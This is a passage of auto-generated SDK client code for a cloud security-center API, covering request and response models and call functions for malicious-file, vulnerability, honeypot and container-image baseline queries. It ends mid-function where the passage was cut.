model DescribeGroupedMaliciousFilesResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedMaliciousFilesResponseBody(name='body'),
}

async function describeGroupedMaliciousFilesWithOptions(request: DescribeGroupedMaliciousFilesRequest, runtime: Util.RuntimeOptions): DescribeGroupedMaliciousFilesResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.fuzzyMaliciousName)) {
    query['FuzzyMaliciousName'] = request.fuzzyMaliciousName;
  }
  if (!Util.isUnset(request.imageDigest)) {
    query['ImageDigest'] = request.imageDigest;
  }
  if (!Util.isUnset(request.imageLayer)) {
    query['ImageLayer'] = request.imageLayer;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.maliciousMd5)) {
    query['MaliciousMd5'] = request.maliciousMd5;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.repoId)) {
    query['RepoId'] = request.repoId;
  }
  if (!Util.isUnset(request.repoInstanceId)) {
    query['RepoInstanceId'] = request.repoInstanceId;
  }
  if (!Util.isUnset(request.repoName)) {
    query['RepoName'] = request.repoName;
  }
  if (!Util.isUnset(request.repoNamespace)) {
    query['RepoNamespace'] = request.repoNamespace;
  }
  if (!Util.isUnset(request.repoRegionId)) {
    query['RepoRegionId'] = request.repoRegionId;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedMaliciousFiles',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeGroupedMaliciousFiles(request: DescribeGroupedMaliciousFilesRequest): DescribeGroupedMaliciousFilesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedMaliciousFilesWithOptions(request, runtime);
}

model DescribeGroupedTagsRequest {
  machineTypes?: string(name='MachineTypes'),
}

model DescribeGroupedTagsResponseBody = {
  count?: int32(name='Count'),
  groupedFileds?: [ 
    {
      count?: string(name='Count'),
      name?: string(name='Name'),
      tagId?: int32(name='TagId'),
    }
  ](name='GroupedFileds'),
  httpStatusCode?: int32(name='HttpStatusCode'),
  requestId?: string(name='RequestId'),
  success?: boolean(name='Success'),
}

model DescribeGroupedTagsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedTagsResponseBody(name='body'),
}

async function describeGroupedTagsWithOptions(request: DescribeGroupedTagsRequest, runtime: Util.RuntimeOptions): DescribeGroupedTagsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.machineTypes)) {
    query['MachineTypes'] = request.machineTypes;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedTags',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeGroupedTags(request: DescribeGroupedTagsRequest): DescribeGroupedTagsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedTagsWithOptions(request, runtime);
}

model DescribeGroupedVulRequest {
  aliasName?: string(name='AliasName'),
  assetType?: string(name='AssetType'),
  attachTypes?: string(name='AttachTypes'),
  containerFieldName?: string(name='ContainerFieldName'),
  currentPage?: int32(name='CurrentPage'),
  dealed?: string(name='Dealed'),
  groupId?: string(name='GroupId'),
  lang?: string(name='Lang'),
  necessity?: string(name='Necessity'),
  pageSize?: int32(name='PageSize'),
  searchTags?: string(name='SearchTags'),
  targetType?: string(name='TargetType'),
  type?: string(name='Type'),
  uuids?: string(name='Uuids'),
}

model DescribeGroupedVulResponseBody = {
  currentPage?: int32(name='CurrentPage'),
  groupedVulItems?: [ 
    {
      aliasName?: string(name='AliasName'),
      asapCount?: int32(name='AsapCount'),
      gmtLast?: long(name='GmtLast'),
      handledCount?: int32(name='HandledCount'),
      laterCount?: int32(name='LaterCount'),
      name?: string(name='Name'),
      nntfCount?: int32(name='NntfCount'),
      tags?: string(name='Tags'),
      totalFixCount?: long(name='TotalFixCount'),
      type?: string(name='Type'),
    }
  ](name='GroupedVulItems'),
  pageSize?: int32(name='PageSize'),
  requestId?: string(name='RequestId'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeGroupedVulResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeGroupedVulResponseBody(name='body'),
}

async function describeGroupedVulWithOptions(request: DescribeGroupedVulRequest, runtime: Util.RuntimeOptions): DescribeGroupedVulResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.assetType)) {
    query['AssetType'] = request.assetType;
  }
  if (!Util.isUnset(request.attachTypes)) {
    query['AttachTypes'] = request.attachTypes;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.searchTags)) {
    query['SearchTags'] = request.searchTags;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeGroupedVul',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeGroupedVul(request: DescribeGroupedVulRequest): DescribeGroupedVulResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeGroupedVulWithOptions(request, runtime);
}

model DescribeHcExportInfoRequest {
  exportId?: long(name='ExportId'),
}

model DescribeHcExportInfoResponseBody = {
  currentCount?: int32(name='CurrentCount'),
  fileName?: string(name='FileName'),
  gmtCreate?: long(name='GmtCreate'),
  id?: long(name='Id'),
  link?: string(name='Link'),
  progress?: int32(name='Progress'),
  requestId?: string(name='RequestId'),
  resultStatus?: string(name='ResultStatus'),
  totalCount?: int32(name='TotalCount'),
}

model DescribeHcExportInfoResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeHcExportInfoResponseBody(name='body'),
}

async function describeHcExportInfoWithOptions(request: DescribeHcExportInfoRequest, runtime: Util.RuntimeOptions): DescribeHcExportInfoResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportId)) {
    query['ExportId'] = request.exportId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeHcExportInfo',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeHcExportInfo(request: DescribeHcExportInfoRequest): DescribeHcExportInfoResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeHcExportInfoWithOptions(request, runtime);
}

model DescribeHoneyPotAuthResponseBody = {
  honeyPotAuthCount?: long(name='HoneyPotAuthCount'),
  honeyPotCount?: int32(name='HoneyPotCount'),
  requestId?: string(name='RequestId'),
}

model DescribeHoneyPotAuthResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeHoneyPotAuthResponseBody(name='body'),
}

async function describeHoneyPotAuthWithOptions(runtime: Util.RuntimeOptions): DescribeHoneyPotAuthResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'DescribeHoneyPotAuth',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeHoneyPotAuth(): DescribeHoneyPotAuthResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeHoneyPotAuthWithOptions(runtime);
}

model DescribeHoneyPotSuspStatisticsRequest {
  from?: string(name='From'),
  statisticsDays?: int32(name='StatisticsDays'),
  statisticsKeyType?: string(name='StatisticsKeyType'),
}

model DescribeHoneyPotSuspStatisticsResponseBody = {
  requestId?: string(name='RequestId'),
  suspHoneyPotStatisticsResponse?: [ 
    {
      count?: int32(name='Count'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      type?: string(name='Type'),
      vpcId?: string(name='VpcId'),
      vpcName?: string(name='VpcName'),
    }
  ](name='SuspHoneyPotStatisticsResponse'),
}

model DescribeHoneyPotSuspStatisticsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeHoneyPotSuspStatisticsResponseBody(name='body'),
}

async function describeHoneyPotSuspStatisticsWithOptions(request: DescribeHoneyPotSuspStatisticsRequest, runtime: Util.RuntimeOptions): DescribeHoneyPotSuspStatisticsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.statisticsDays)) {
    query['StatisticsDays'] = request.statisticsDays;
  }
  if (!Util.isUnset(request.statisticsKeyType)) {
    query['StatisticsKeyType'] = request.statisticsKeyType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeHoneyPotSuspStatistics',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeHoneyPotSuspStatistics(request: DescribeHoneyPotSuspStatisticsRequest): DescribeHoneyPotSuspStatisticsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeHoneyPotSuspStatisticsWithOptions(request, runtime);
}

model DescribeImageRequest {
  imageInstanceId?: string(name='ImageInstanceId', description='The instance ID of the image.

>  You can call the [DescribeImageInstances](~~DescribeImageInstances~~) operation to query the IDs of instances.', example='cri-hfs6gaawhyu6****'),
  imageRegionId?: string(name='ImageRegionId', description='The region ID of the image.

>  You can call the [DescribeImageInstances](~~DescribeImageInstances~~) operation to query the IDs of regions.', example='cn-hangzhou'),
  imageRepoId?: string(name='ImageRepoId', description='The ID of the image repository.

>  You can call the [DescribeImageInstances](~~DescribeImageInstances~~) operation to query the IDs of image repositories.', example='crr-7i88t7lx3fmf****'),
  imageTag?: string(name='ImageTag', description='The tag that is added to the image.

>  You can call the [DescribeImageInstances](~~DescribeImageInstances~~) operation to query tags.', example='1.8.0.15'),
}

model DescribeImageResponseBody = {
  data?: {
    digest?: string(name='Digest', description='The digest value of the image.', example='0afb98d97f1a4030782fcf47e186909e5ad957bcc182d8be70334e0684b2****'),
  }(name='Data', description='The information about the image digest.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DescribeImageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageResponseBody(name='body'),
}

async function describeImageWithOptions(request: DescribeImageRequest, runtime: Util.RuntimeOptions): DescribeImageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.imageInstanceId)) {
    query['ImageInstanceId'] = request.imageInstanceId;
  }
  if (!Util.isUnset(request.imageRegionId)) {
    query['ImageRegionId'] = request.imageRegionId;
  }
  if (!Util.isUnset(request.imageRepoId)) {
    query['ImageRepoId'] = request.imageRepoId;
  }
  if (!Util.isUnset(request.imageTag)) {
    query['ImageTag'] = request.imageTag;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImage(request: DescribeImageRequest): DescribeImageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageWithOptions(request, runtime);
}

model DescribeImageBaselineCheckResultRequest {
  criteria?: string(name='Criteria'),
  criteriaType?: string(name='CriteriaType'),
  currentPage?: int32(name='CurrentPage'),
  imageUuid?: string(name='ImageUuid'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  riskLevel?: string(name='RiskLevel'),
  scanRange?: [ string ](name='ScanRange'),
}

model DescribeImageBaselineCheckResultResponseBody = {
  baselineResult?: [ 
    {
      baselineClassAlias?: string(name='BaselineClassAlias'),
      baselineItemCount?: int32(name='BaselineItemCount'),
      baselineNameAlias?: string(name='BaselineNameAlias'),
      baselineNameKey?: string(name='BaselineNameKey'),
      baselineNameLevel?: string(name='BaselineNameLevel'),
      firstScanTime?: long(name='FirstScanTime'),
      highRiskItemCount?: int32(name='HighRiskItemCount'),
      lastScanTime?: long(name='LastScanTime'),
      lowRiskItemCount?: int32(name='LowRiskItemCount'),
      middleRiskItemCount?: int32(name='MiddleRiskItemCount'),
      status?: int32(name='Status'),
    }
  ](name='BaselineResult'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeImageBaselineCheckResultResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineCheckResultResponseBody(name='body'),
}

async function describeImageBaselineCheckResultWithOptions(request: DescribeImageBaselineCheckResultRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineCheckResultResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineCheckResult',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageBaselineCheckResult(request: DescribeImageBaselineCheckResultRequest): DescribeImageBaselineCheckResultResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineCheckResultWithOptions(request, runtime);
}

model DescribeImageBaselineCheckSummaryRequest {
  clusterId?: string(name='ClusterId'),
  criteria?: string(name='Criteria'),
  criteriaType?: string(name='CriteriaType'),
  currentPage?: int32(name='CurrentPage'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  riskLevel?: string(name='RiskLevel'),
  scanRange?: [ string ](name='ScanRange'),
}

model DescribeImageBaselineCheckSummaryResponseBody = {
  baselineResultSummary?: [ 
    {
      baselineClassAlias?: string(name='BaselineClassAlias'),
      baselineClassKey?: string(name='BaselineClassKey'),
      baselineNameAlias?: string(name='BaselineNameAlias'),
      baselineNameKey?: string(name='BaselineNameKey'),
      baselineNameLevel?: string(name='BaselineNameLevel'),
      firstScanTime?: long(name='FirstScanTime'),
      highRiskImage?: int32(name='HighRiskImage'),
      lastScanTime?: long(name='LastScanTime'),
      lowRiskImage?: int32(name='LowRiskImage'),
      middleRiskImage?: int32(name='MiddleRiskImage'),
      status?: int32(name='Status'),
    }
  ](name='BaselineResultSummary'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeImageBaselineCheckSummaryResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineCheckSummaryResponseBody(name='body'),
}

async function describeImageBaselineCheckSummaryWithOptions(request: DescribeImageBaselineCheckSummaryRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineCheckSummaryResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.criteria)) {
    query['Criteria'] = request.criteria;
  }
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.riskLevel)) {
    query['RiskLevel'] = request.riskLevel;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineCheckSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageBaselineCheckSummary(request: DescribeImageBaselineCheckSummaryRequest): DescribeImageBaselineCheckSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineCheckSummaryWithOptions(request, runtime);
}

model DescribeImageBaselineDetailRequest {
  baselineItemKey?: string(name='BaselineItemKey', description='The information about the baseline.', example='Valid values include but are not limited to ak_leak, duplicate_uid, duplicate_pwd_hash, and non_pwd_user.'),
  imageUuid?: string(name='ImageUuid', description='The UUID of the image.', example='06293273b67d19516cfcc712194f****'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
}

model DescribeImageBaselineDetailResponseBody = {
  baselineDetail?: {
    advice?: string(name='Advice', description='The suggestion for the management of the risk item.', example='Delete the leaked AccessKey pairs.'),
    baselineClassAlias?: string(name='BaselineClassAlias', description='The alias of the baseline type.', example='ak_leak'),
    baselineItemAlias?: string(name='BaselineItemAlias', description='The alias of the baseline check item.', example='AccessKey pair leak'),
    baselineItemKey?: string(name='BaselineItemKey', description='The key of the baseline check item.', example='ak_leak'),
    baselineNameAlias?: string(name='BaselineNameAlias', description='The alias of the baseline.', example='AccessKey pair leak'),
    description?: string(name='Description', description='The description of the risk item.', example='If an AccessKey pair is leaked, the AccessKey pair may be fraudulently used.'),
    level?: string(name='Level', description='The risk level of the baseline check item. Valid values:

*   **high**
*   **medium**
*   **low**', example='high'),
    prompt?: string(name='Prompt', description='The issue that is detected by using the baseline.', example='/usr/aksk.txt:LTAI4GBEG5zaqX**********'),
    resultId?: string(name='ResultId', description='The ID of the asynchronous request.', example='async__c6f3b0b54613383b40bdce593ffe****'),
  }(name='BaselineDetail', description='The details about the image baseline.'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='0B48AB3C-84FC-424D-A01D-B9270EF4****'),
}

model DescribeImageBaselineDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineDetailResponseBody(name='body'),
}

async function describeImageBaselineDetailWithOptions(request: DescribeImageBaselineDetailRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineItemKey)) {
    query['BaselineItemKey'] = request.baselineItemKey;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageBaselineDetail(request: DescribeImageBaselineDetailRequest): DescribeImageBaselineDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineDetailWithOptions(request, runtime);
}

model DescribeImageBaselineItemListRequest {
  baselineClassKey?: string(name='BaselineClassKey'),
  baselineNameKey?: string(name='BaselineNameKey'),
  currentPage?: int32(name='CurrentPage'),
  imageUuid?: string(name='ImageUuid'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  scanRange?: [ string ](name='ScanRange'),
  status?: string(name='Status'),
  uuids?: [ string ](name='Uuids'),
}

model DescribeImageBaselineItemListResponseBody = {
  baselineItemInfos?: [ 
    {
      baselineClassAlias?: string(name='BaselineClassAlias'),
      baselineClassKey?: string(name='BaselineClassKey'),
      baselineItemAlias?: string(name='BaselineItemAlias'),
      baselineItemKey?: string(name='BaselineItemKey'),
      baselineNameAlias?: string(name='BaselineNameAlias'),
      baselineNameKey?: string(name='BaselineNameKey'),
      status?: int32(name='Status'),
      whiteList?: int32(name='WhiteList'),
    }
  ](name='BaselineItemInfos'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeImageBaselineItemListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineItemListResponseBody(name='body'),
}

async function describeImageBaselineItemListWithOptions(request: DescribeImageBaselineItemListRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineItemListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.baselineClassKey)) {
    query['BaselineClassKey'] = request.baselineClassKey;
  }
  if (!Util.isUnset(request.baselineNameKey)) {
    query['BaselineNameKey'] = request.baselineNameKey;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.imageUuid)) {
    query['ImageUuid'] = request.imageUuid;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.scanRange)) {
    query['ScanRange'] = request.scanRange;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineItemList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageBaselineItemList(request: DescribeImageBaselineItemListRequest): DescribeImageBaselineItemListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineItemListWithOptions(request, runtime);
}

model DescribeImageBaselineStrategyRequest {
  lang?: string(name='Lang', example='zh'),
  strategyId?: long(name='StrategyId', example='8037'),
}

model DescribeImageBaselineStrategyResponseBody = {
  requestId?: string(name='RequestId', example='9F85AC10-A1FE-54D7-935A-F28D5256****'),
  strategy?: {
    baselineItemList?: [ 
      {
        classKey?: string(name='ClassKey', example='identification'),
        itemKey?: string(name='ItemKey', example='duplicate_pwd_hash'),
        nameKey?: string(name='NameKey', example='identification'),
      }
    ](name='BaselineItemList'),
    selectedItemCount?: int32(name='SelectedItemCount', example='10'),
    strategyId?: long(name='StrategyId', example='8257'),
    strategyName?: string(name='StrategyName', example='default'),
    totalItemCount?: int32(name='TotalItemCount', example='100'),
    type?: string(name='Type', example='default'),
  }(name='Strategy'),
}

model DescribeImageBaselineStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageBaselineStrategyResponseBody(name='body'),
}

async function describeImageBaselineStrategyWithOptions(request: DescribeImageBaselineStrategyRequest, runtime: Util.RuntimeOptions): DescribeImageBaselineStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageBaselineStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageBaselineStrategy(request: DescribeImageBaselineStrategyRequest): DescribeImageBaselineStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageBaselineStrategyWithOptions(request, runtime);
}

model DescribeImageCriteriaRequest {
  value?: string(name='Value'),
}

model DescribeImageCriteriaResponseBody = {
  criteriaList?: [ 
    {
      name?: string(name='Name'),
      type?: string(name='Type'),
      values?: string(name='Values'),
    }
  ](name='CriteriaList'),
  requestId?: string(name='RequestId'),
}

model DescribeImageCriteriaResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageCriteriaResponseBody(name='body'),
}

async function describeImageCriteriaWithOptions(request: DescribeImageCriteriaRequest, runtime: Util.RuntimeOptions): DescribeImageCriteriaResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.value)) {
    query['Value'] = request.value;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeImageCriteria',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeImageCriteria(request: DescribeImageCriteriaRequest): DescribeImageCriteriaResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeImageCriteriaWithOptions(request, runtime);
}

model DescribeImageFixTaskRequest {
  currentPage?: int32(name='CurrentPage'),
  endTime?: long(name='EndTime'),
  pageSize?: int32(name='PageSize'),
  startTime?: long(name='StartTime'),
  status?: string(name='Status'),
}

model DescribeImageFixTaskResponseBody = {
  buildTasks?: [ 
    {
      buildTaskId?: string(name='BuildTaskId'),
      finishTime?: string(name='FinishTime'),
      fixTime?: string(name='FixTime'),
      newTag?: string(name='NewTag'),
      newUuid?: string(name='NewUuid'),
      oldTag?: string(name='OldTag'),
      oldUuid?: string(name='OldUuid'),
      regionId?: string(name='RegionId'),
      repoName?: string(name='RepoName'),
      repoNamespace?: string(name='RepoNamespace'),
      status?: int32(name='Status'),
      taskType?: string(name='TaskType'),
    }
  ](name='BuildTasks'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeImageFixTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeImageFixTaskResponseBody(name='body'),
}

async function describeImageFixTaskWithOptions(request: DescribeImageFixTaskRequest, runtime: Util.RuntimeOptions): DescribeImageFixTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
